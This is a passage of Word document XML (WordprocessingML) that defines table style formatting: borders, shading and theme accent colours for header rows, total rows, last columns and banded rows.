      <w:rPr>
        <w:sz w:val="24"/>
        <w:szCs w:val="24"/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="single" w:sz="24" w:space="0" w:color="1E5272" w:themeColor="text1"/>
          <w:right w:val="nil"/>
          <w:insideH w:val="nil"/>
          <w:insideV w:val="nil"/>
        </w:tcBorders>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF" w:themeFill="background1"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="lastRow">
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="single" w:sz="8" w:space="0" w:color="1E5272"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E5272" w:themeColor="text1"/>
          <w:insideH w:val="nil"/>
          <w:insideV w:val="nil"/>
        </w:tcBorders>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF" w:themeFill="background1"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="lastCol">
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="nil"/>
          <w:left w:val="single" w:sz="8" w:space="0" w:color="1E5272"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D7EC" w:themeFill="text1" w:themeFillTint="3F"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Horz">
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:insideH w:val="nil"/>
          <w:insideV w:val="nil"/>
        </w:tcBorders>
        <w:shd w:val="clear" w:color="auto" w:fill="B7D7E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68727B" w:themeColor="accent1"/>
        <w:left w:val="single" w:sz="8" w:space="0" w:color="68727B" w:themeColor="accent1"/>
        <w:bottom w:val="single" w:sz="8" w:space="0" w:color="68727B" w:themeColor="accent1"/>
        <w:right w:val="single" w:sz="8" w:space="0" w:color="68727B" w:themeColor="accent1"/>
      </w:tblBorders>
    </w:tblPr>
    <w:tblStylePr w:type="firstRow">
      <w:rPr>
        <w:sz w:val="24"/>
        <w:szCs w:val="24"/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="single" w:sz="24" w:space="0" w:color="68727B" w:themeColor="accent1"/>
          <w:right w:val="nil"/>
          <w:insideH w:val="nil"/>
          <w:insideV w:val="nil"/>
        </w:tcBorders>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF" w:themeFill="background1"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="lastRow">
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="single" w:sz="8" w:space="0" w:color="68727B"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727B" w:themeColor="accent1"/>
          <w:insideH w:val="nil"/>
          <w:insideV w:val="nil"/>
        </w:tcBorders>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF" w:themeFill="background1"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="lastCol">
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="nil"/>
          <w:left w:val="single" w:sz="8" w:space="0" w:color="68727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DCDF" w:themeFill="accent1" w:themeFillTint="3F"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Horz">
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:insideH w:val="nil"/>
          <w:insideV w:val="nil"/>
        </w:tcBorders>
        <w:shd w:val="clear" w:color="auto" w:fill="D9DC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D94D22" w:themeColor="accent2"/>
        <w:left w:val="single" w:sz="8" w:space="0" w:color="D94D22" w:themeColor="accent2"/>
        <w:bottom w:val="single" w:sz="8" w:space="0" w:color="D94D22" w:themeColor="accent2"/>
        <w:right w:val="single" w:sz="8" w:space="0" w:color="D94D22" w:themeColor="accent2"/>
      </w:tblBorders>
    </w:tblPr>
    <w:tblStylePr w:type="firstRow">
      <w:rPr>
        <w:sz w:val="24"/>
        <w:szCs w:val="24"/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="single" w:sz="24" w:space="0" w:color="D94D22" w:themeColor="accent2"/>
          <w:right w:val="nil"/>
          <w:insideH w:val="nil"/>
          <w:insideV w:val="nil"/>
        </w:tcBorders>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF" w:themeFill="background1"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="lastRow">
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="single" w:sz="8" w:space="0" w:color="D94D2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94D22" w:themeColor="accent2"/>
          <w:insideH w:val="nil"/>
          <w:insideV w:val="nil"/>
        </w:tcBorders>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF" w:themeFill="background1"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="lastCol">
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="nil"/>
          <w:left w:val="single" w:sz="8" w:space="0" w:color="D94D2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2C7" w:themeFill="accent2" w:themeFillTint="3F"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Horz">
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:insideH w:val="nil"/>
          <w:insideV w:val="nil"/>
        </w:tcBorders>
        <w:shd w:val="clear" w:color="auto" w:fill="F6D2C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A7A8B0" w:themeColor="accent3"/>
        <w:left w:val="single" w:sz="8" w:space="0" w:color="A7A8B0" w:themeColor="accent3"/>
        <w:bottom w:val="single" w:sz="8" w:space="0" w:color="A7A8B0" w:themeColor="accent3"/>
        <w:right w:val="single" w:sz="8" w:space="0" w:color="A7A8B0" w:themeColor="accent3"/>
      </w:tblBorders>
    </w:tblPr>
    <w:tblStylePr w:type="firstRow">
      <w:rPr>
        <w:sz w:val="24"/>
        <w:szCs w:val="24"/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="single" w:sz="24" w:space="0" w:color="A7A8B0" w:themeColor="accent3"/>
          <w:right w:val="nil"/>
          <w:insideH w:val="nil"/>
          <w:insideV w:val="nil"/>
        </w:tcBorders>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF" w:themeFill="background1"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="lastRow">
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="single" w:sz="8" w:space="0" w:color="A7A8B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7A8B0" w:themeColor="accent3"/>
          <w:insideH w:val="nil"/>
          <w:insideV w:val="nil"/>
        </w:tcBorders>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF" w:themeFill="background1"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="lastCol">
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="nil"/>
          <w:left w:val="single" w:sz="8" w:space="0" w:color="A7A8B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E9EB" w:themeFill="accent3" w:themeFillTint="3F"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Horz">
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:insideH w:val="nil"/>
          <w:insideV w:val="nil"/>
        </w:tcBorders>
        <w:shd w:val="clear" w:color="auto" w:fill="E9E9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00929F" w:themeColor="accent4"/>
        <w:left w:val="single" w:sz="8" w:space="0" w:color="00929F" w:themeColor="accent4"/>
        <w:bottom w:val="single" w:sz="8" w:space="0" w:color="00929F" w:themeColor="accent4"/>
        <w:right w:val="single" w:sz="8" w:space="0" w:color="00929F" w:themeColor="accent4"/>
      </w:tblBorders>
    </w:tblPr>
    <w:tblStylePr w:type="firstRow">
      <w:rPr>
        <w:sz w:val="24"/>
        <w:szCs w:val="24"/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="single" w:sz="24" w:space="0" w:color="00929F" w:themeColor="accent4"/>
          <w:right w:val="nil"/>
          <w:insideH w:val="nil"/>
          <w:insideV w:val="nil"/>
        </w:tcBorders>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF" w:themeFill="background1"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="lastRow">
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="single" w:sz="8" w:space="0" w:color="00929F"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29F" w:themeColor="accent4"/>
          <w:insideH w:val="nil"/>
          <w:insideV w:val="nil"/>
        </w:tcBorders>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF" w:themeFill="background1"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="lastCol">
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="nil"/>
          <w:left w:val="single" w:sz="8" w:space="0" w:color="00929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8F7FF" w:themeFill="accent4" w:themeFillTint="3F"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Horz">
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:insideH w:val="nil"/>
          <w:insideV w:val="nil"/>
        </w:tcBorders>
        <w:shd w:val="clear" w:color="auto" w:fill="A8F7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1E5272" w:themeColor="accent5"/>
        <w:left w:val="single" w:sz="8" w:space="0" w:color="1E5272" w:themeColor="accent5"/>
        <w:bottom w:val="single" w:sz="8" w:space="0" w:color="1E5272" w:themeColor="accent5"/>
        <w:right w:val="single" w:sz="8" w:space="0" w:color="1E5272" w:themeColor="accent5"/>
      </w:tblBorders>
    </w:tblPr>
    <w:tblStylePr w:type="firstRow">
      <w:rPr>
        <w:sz w:val="24"/>
        <w:szCs w:val="24"/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="single" w:sz="24" w:space="0" w:color="1E5272" w:themeColor="accent5"/>
          <w:right w:val="nil"/>
          <w:insideH w:val="nil"/>
          <w:insideV w:val="nil"/>
        </w:tcBorders>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF" w:themeFill="background1"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="lastRow">
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="single" w:sz="8" w:space="0" w:color="1E5272"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E5272" w:themeColor="accent5"/>
          <w:insideH w:val="nil"/>
          <w:insideV w:val="nil"/>
        </w:tcBorders>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF" w:themeFill="background1"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="lastCol">
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="nil"/>
          <w:left w:val="single" w:sz="8" w:space="0" w:color="1E527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D7EC" w:themeFill="accent5" w:themeFillTint="3F"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Horz">
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:insideH w:val="nil"/>
          <w:insideV w:val="nil"/>
        </w:tcBorders>
        <w:shd w:val="clear" w:color="auto" w:fill="B7D7E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E0F31"/>
    <w:pPr>
      <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorHAnsi" w:cstheme="majorBidi"/>
      <w:color w:val="1E5272" w:themeColor="text1"/>
    </w:rPr>
    <w:tblPr>
      <w:tblStyleRowBandSize w:val="1"/>
      <w:tblStyleColBandSize w:val="1"/>
      <w:tblBorders>
        <w:top w:val="single" w:sz="8" w:space="0" w:color="007698" w:themeColor="accent6"/>
        <w:left w:val="single" w:sz="8" w:space="0" w:color="007698" w:themeColor="accent6"/>
        <w:bottom w:val="single" w:sz="8" w:space="0" w:color="007698" w:themeColor="accent6"/>
        <w:right w:val="single" w:sz="8" w:space="0" w:color="007698" w:themeColor="accent6"/>
      </w:tblBorders>
    </w:tblPr>
    <w:tblStylePr w:type="firstRow">
      <w:rPr>
        <w:sz w:val="24"/>
        <w:szCs w:val="24"/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="single" w:sz="24" w:space="0" w:color="007698" w:themeColor="accent6"/>
          <w:right w:val="nil"/>
          <w:insideH w:val="nil"/>
          <w:insideV w:val="nil"/>
        </w:tcBorders>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF" w:themeFill="background1"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="lastRow">
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="single" w:sz="8" w:space="0" w:color="007698"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698" w:themeColor="accent6"/>
          <w:insideH w:val="nil"/>
          <w:insideV w:val="nil"/>
        </w:tcBorders>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF" w:themeFill="background1"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="lastCol">
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="nil"/>
          <w:left w:val="single" w:sz="8" w:space="0" w:color="00769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6EAFF" w:themeFill="accent6" w:themeFillTint="3F"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Horz">
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:insideH w:val="nil"/>
          <w:insideV w:val="nil"/>
        </w:tcBorders>
        <w:shd w:val="clear" w:color="auto" w:fill="A6EA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E0F31"/>
    <w:pPr>
      <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
    </w:pPr>
    <w:tblPr>
      <w:tblStyleRowBandSize w:val="1"/>
      <w:tblStyleColBandSize w:val="1"/>
      <w:tblBorders>
        <w:top w:val="single" w:sz="8" w:space="0" w:color="3185BA" w:themeColor="text1" w:themeTint="BF"/>
        <w:left w:val="single" w:sz="8" w:space="0" w:color="3185BA" w:themeColor="text1" w:themeTint="BF"/>
        <w:bottom w:val="single" w:sz="8" w:space="0" w:color="3185BA" w:themeColor="text1" w:themeTint="BF"/>
        <w:right w:val="single" w:sz="8" w:space="0" w:color="3185BA" w:themeColor="text1" w:themeTint="BF"/>
        <w:insideH w:val="single" w:sz="8" w:space="0" w:color="3185BA" w:themeColor="text1" w:themeTint="BF"/>
      </w:tblBorders>
    </w:tblPr>
    <w:tblStylePr w:type="firstRow">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:rPr>
        <w:b/>
        <w:bCs/>
        <w:color w:val="FFFFFF" w:themeColor="background1"/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="single" w:sz="8" w:space="0" w:color="3185BA" w:themeColor="text1" w:themeTint="BF"/>
          <w:left w:val="single" w:sz="8" w:space="0" w:color="3185BA" w:themeColor="text1" w:themeTint="BF"/>
          <w:bottom w:val="single" w:sz="8" w:space="0" w:color="3185BA" w:themeColor="text1" w:themeTint="BF"/>
          <w:right w:val="single" w:sz="8" w:space="0" w:color="3185BA" w:themeColor="text1" w:themeTint="BF"/>
          <w:insideH w:val="nil"/>
          <w:insideV w:val="nil"/>
        </w:tcBorders>
        <w:shd w:val="clear" w:color="auto" w:fill="1E5272" w:themeFill="text1"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="lastRow">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:rPr>
        <w:b/>
        <w:bCs/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="double" w:sz="6" w:space="0" w:color="3185BA" w:themeColor="text1" w:themeTint="BF"/>
          <w:left w:val="single" w:sz="8" w:space="0" w:color="3185BA" w:themeColor="text1" w:themeTint="BF"/>
          <w:bottom w:val="single" w:sz="8" w:space="0" w:color="3185BA" w:themeColor="text1" w:themeTint="BF"/>
          <w:right w:val="single" w:sz="8" w:space="0" w:color="3185BA" w:themeColor="text1" w:themeTint="BF"/>
          <w:insideH w:val="nil"/>
          <w:insideV w:val="nil"/>
        </w:tcBorders>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="firstCol">
      <w:rPr>
        <w:b/>
        <w:bCs/>
      </w:rPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="lastCol">
      <w:rPr>
        <w:b/>
        <w:bCs/>
      </w:rPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Vert">
      <w:tblPr/>
      <w:tcPr>
        <w:shd w:val="clear" w:color="auto" w:fill="B7D7EC" w:themeFill="text1" w:themeFillTint="3F"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Horz">
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:insideH w:val="nil"/>
          <w:insideV w:val="nil"/>
        </w:tcBorders>
        <w:shd w:val="clear" w:color="auto" w:fill="B7D7EC"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E0F31"/>
    <w:pPr>
      <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
    </w:pPr>
    <w:tblPr>
      <w:tblStyleRowBandSize w:val="1"/>
      <w:tblStyleColBandSize w:val="1"/>
      <w:tblBorders>
        <w:top w:val="single" w:sz="8" w:space="0" w:color="8C959E" w:themeColor="accent1" w:themeTint="BF"/>
        <w:left w:val="single" w:sz="8" w:space="0" w:color="8C959E" w:themeColor="accent1" w:themeTint="BF"/>
        <w:bottom w:val="single" w:sz="8" w:space="0" w:color="8C959E" w:themeColor="accent1" w:themeTint="BF"/>
        <w:right w:val="single" w:sz="8" w:space="0" w:color="8C959E" w:themeColor="accent1" w:themeTint="BF"/>
        <w:insideH w:val="single" w:sz="8" w:space="0" w:color="8C959E" w:themeColor="accent1" w:themeTint="BF"/>
      </w:tblBorders>
    </w:tblPr>
    <w:tblStylePr w:type="firstRow">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:rPr>
        <w:b/>
        <w:bCs/>
        <w:color w:val="FFFFFF" w:themeColor="background1"/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="single" w:sz="8" w:space="0" w:color="8C959E" w:themeColor="accent1" w:themeTint="BF"/>
          <w:left w:val="single" w:sz="8" w:space="0" w:color="8C959E" w:themeColor="accent1" w:themeTint="BF"/>
          <w:bottom w:val="single" w:sz="8" w:space="0" w:color="8C959E" w:themeColor="accent1" w:themeTint="BF"/>
          <w:right w:val="single" w:sz="8" w:space="0" w:color="8C959E" w:themeColor="accent1" w:themeTint="BF"/>
          <w:insideH w:val="nil"/>
          <w:insideV w:val="nil"/>
        </w:tcBorders>
        <w:shd w:val="clear" w:color="auto" w:fill="68727B" w:themeFill="accent1"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="lastRow">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:rPr>
        <w:b/>
        <w:bCs/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="double" w:sz="6" w:space="0" w:color="8C959E" w:themeColor="accent1" w:themeTint="BF"/>
          <w:left w:val="single" w:sz="8" w:space="0" w:color="8C959E" w:themeColor="accent1" w:themeTint="BF"/>
          <w:bottom w:val="single" w:sz="8" w:space="0" w:color="8C959E" w:themeColor="accent1" w:themeTint="BF"/>
          <w:right w:val="single" w:sz="8" w:space="0" w:color="8C95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9DCDF" w:themeFill="accent1" w:themeFillTint="3F"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Horz">
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:insideH w:val="nil"/>
          <w:insideV w:val="nil"/>
        </w:tcBorders>
        <w:shd w:val="clear" w:color="auto" w:fill="D9DCD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E0F31"/>
    <w:pPr>
      <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
    </w:pPr>
    <w:tblPr>
      <w:tblStyleRowBandSize w:val="1"/>
      <w:tblStyleColBandSize w:val="1"/>
      <w:tblBorders>
        <w:top w:val="single" w:sz="8" w:space="0" w:color="E47757" w:themeColor="accent2" w:themeTint="BF"/>
        <w:left w:val="single" w:sz="8" w:space="0" w:color="E47757" w:themeColor="accent2" w:themeTint="BF"/>
        <w:bottom w:val="single" w:sz="8" w:space="0" w:color="E47757" w:themeColor="accent2" w:themeTint="BF"/>
        <w:right w:val="single" w:sz="8" w:space="0" w:color="E47757" w:themeColor="accent2" w:themeTint="BF"/>
        <w:insideH w:val="single" w:sz="8" w:space="0" w:color="E47757" w:themeColor="accent2" w:themeTint="BF"/>
      </w:tblBorders>
    </w:tblPr>
    <w:tblStylePr w:type="firstRow">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:rPr>
        <w:b/>
        <w:bCs/>
        <w:color w:val="FFFFFF" w:themeColor="background1"/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="single" w:sz="8" w:space="0" w:color="E47757" w:themeColor="accent2" w:themeTint="BF"/>
          <w:left w:val="single" w:sz="8" w:space="0" w:color="E47757" w:themeColor="accent2" w:themeTint="BF"/>
          <w:bottom w:val="single" w:sz="8" w:space="0" w:color="E47757" w:themeColor="accent2" w:themeTint="BF"/>
          <w:right w:val="single" w:sz="8" w:space="0" w:color="E47757" w:themeColor="accent2" w:themeTint="BF"/>
          <w:insideH w:val="nil"/>
          <w:insideV w:val="nil"/>
        </w:tcBorders>
        <w:shd w:val="clear" w:color="auto" w:fill="D94D22" w:themeFill="accent2"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="lastRow">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:rPr>
        <w:b/>
        <w:bCs/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="double" w:sz="6" w:space="0" w:color="E47757" w:themeColor="accent2" w:themeTint="BF"/>
          <w:left w:val="single" w:sz="8" w:space="0" w:color="E47757" w:themeColor="accent2" w:themeTint="BF"/>
          <w:bottom w:val="single" w:sz="8" w:space="0" w:color="E47757" w:themeColor="accent2" w:themeTint="BF"/>
          <w:right w:val="single" w:sz="8" w:space="0" w:color="E4775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2C7" w:themeFill="accent2" w:themeFillTint="3F"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Horz">
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:insideH w:val="nil"/>
          <w:insideV w:val="nil"/>
        </w:tcBorders>
        <w:shd w:val="clear" w:color="auto" w:fill="F6D2C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E0F31"/>
    <w:pPr>
      <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
    </w:pPr>
    <w:tblPr>
      <w:tblStyleRowBandSize w:val="1"/>
      <w:tblStyleColBandSize w:val="1"/>
      <w:tblBorders>
        <w:top w:val="single" w:sz="8" w:space="0" w:color="BCBDC3" w:themeColor="accent3" w:themeTint="BF"/>
        <w:left w:val="single" w:sz="8" w:space="0" w:color="BCBDC3" w:themeColor="accent3" w:themeTint="BF"/>
        <w:bottom w:val="single" w:sz="8" w:space="0" w:color="BCBDC3" w:themeColor="accent3" w:themeTint="BF"/>
        <w:right w:val="single" w:sz="8" w:space="0" w:color="BCBDC3" w:themeColor="accent3" w:themeTint="BF"/>
        <w:insideH w:val="single" w:sz="8" w:space="0" w:color="BCBDC3" w:themeColor="accent3" w:themeTint="BF"/>
      </w:tblBorders>
    </w:tblPr>
    <w:tblStylePr w:type="firstRow">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:rPr>
        <w:b/>
        <w:bCs/>
        <w:color w:val="FFFFFF" w:themeColor="background1"/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="single" w:sz="8" w:space="0" w:color="BCBDC3" w:themeColor="accent3" w:themeTint="BF"/>
          <w:left w:val="single" w:sz="8" w:space="0" w:color="BCBDC3" w:themeColor="accent3" w:themeTint="BF"/>
          <w:bottom w:val="single" w:sz="8" w:space="0" w:color="BCBDC3" w:themeColor="accent3" w:themeTint="BF"/>
          <w:right w:val="single" w:sz="8" w:space="0" w:color="BCBDC3" w:themeColor="accent3" w:themeTint="BF"/>
          <w:insideH w:val="nil"/>
          <w:insideV w:val="nil"/>
        </w:tcBorders>
        <w:shd w:val="clear" w:color="auto" w:fill="A7A8B0" w:themeFill="accent3"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="lastRow">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:rPr>
        <w:b/>
        <w:bCs/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="double" w:sz="6" w:space="0" w:color="BCBDC3" w:themeColor="accent3" w:themeTint="BF"/>
          <w:left w:val="single" w:sz="8" w:space="0" w:color="BCBDC3" w:themeColor="accent3" w:themeTint="BF"/>
          <w:bottom w:val="single" w:sz="8" w:space="0" w:color="BCBDC3" w:themeColor="accent3" w:themeTint="BF"/>
          <w:right w:val="single" w:sz="8" w:space="0" w:color="BCBDC3" w:themeColor="accent3" w:themeTint="BF"/>
          <w:insideH w:val="nil"/>
          <w:insideV w:val="nil"/>
        </w:tcBorders>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="firstCol">
      <w:rPr>
        <w:b/>
        <w:bCs/>
      </w:rPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="lastCol">
      <w:rPr>
        <w:b/>
        <w:bCs/>
      </w:rPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Vert">
      <w:tblPr/>
      <w:tcPr>
        <w:shd w:val="clear" w:color="auto" w:fill="E9E9EB" w:themeFill="accent3" w:themeFillTint="3F"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Horz">
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:insideH w:val="nil"/>
          <w:insideV w:val="nil"/>
        </w:tcBorders>
        <w:shd w:val="clear" w:color="auto" w:fill="E9E9E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E0F31"/>
    <w:pPr>
      <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
    </w:pPr>
    <w:tblPr>
      <w:tblStyleRowBandSize w:val="1"/>
      <w:tblStyleColBandSize w:val="1"/>
      <w:tblBorders>
        <w:top w:val="single" w:sz="8" w:space="0" w:color="00E2F7" w:themeColor="accent4" w:themeTint="BF"/>
        <w:left w:val="single" w:sz="8" w:space="0" w:color="00E2F7" w:themeColor="accent4" w:themeTint="BF"/>
        <w:bottom w:val="single" w:sz="8" w:space="0" w:color="00E2F7" w:themeColor="accent4" w:themeTint="BF"/>
        <w:right w:val="single" w:sz="8" w:space="0" w:color="00E2F7" w:themeColor="accent4" w:themeTint="BF"/>
        <w:insideH w:val="single" w:sz="8" w:space="0" w:color="00E2F7" w:themeColor="accent4" w:themeTint="BF"/>
      </w:tblBorders>
    </w:tblPr>
    <w:tblStylePr w:type="firstRow">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:rPr>
        <w:b/>
        <w:bCs/>
        <w:color w:val="FFFFFF" w:themeColor="background1"/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="single" w:sz="8" w:space="0" w:color="00E2F7" w:themeColor="accent4" w:themeTint="BF"/>
          <w:left w:val="single" w:sz="8" w:space="0" w:color="00E2F7" w:themeColor="accent4" w:themeTint="BF"/>
          <w:bottom w:val="single" w:sz="8" w:space="0" w:color="00E2F7" w:themeColor="accent4" w:themeTint="BF"/>
          <w:right w:val="single" w:sz="8" w:space="0" w:color="00E2F7" w:themeColor="accent4" w:themeTint="BF"/>
          <w:insideH w:val="nil"/>
          <w:insideV w:val="nil"/>
        </w:tcBorders>
        <w:shd w:val="clear" w:color="auto" w:fill="00929F" w:themeFill="accent4"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="lastRow">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:rPr>
        <w:b/>
        <w:bCs/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="double" w:sz="6" w:space="0" w:color="00E2F7" w:themeColor="accent4" w:themeTint="BF"/>
          <w:left w:val="single" w:sz="8" w:space="0" w:color="00E2F7" w:themeColor="accent4" w:themeTint="BF"/>
          <w:bottom w:val="single" w:sz="8" w:space="0" w:color="00E2F7" w:themeColor="accent4" w:themeTint="BF"/>
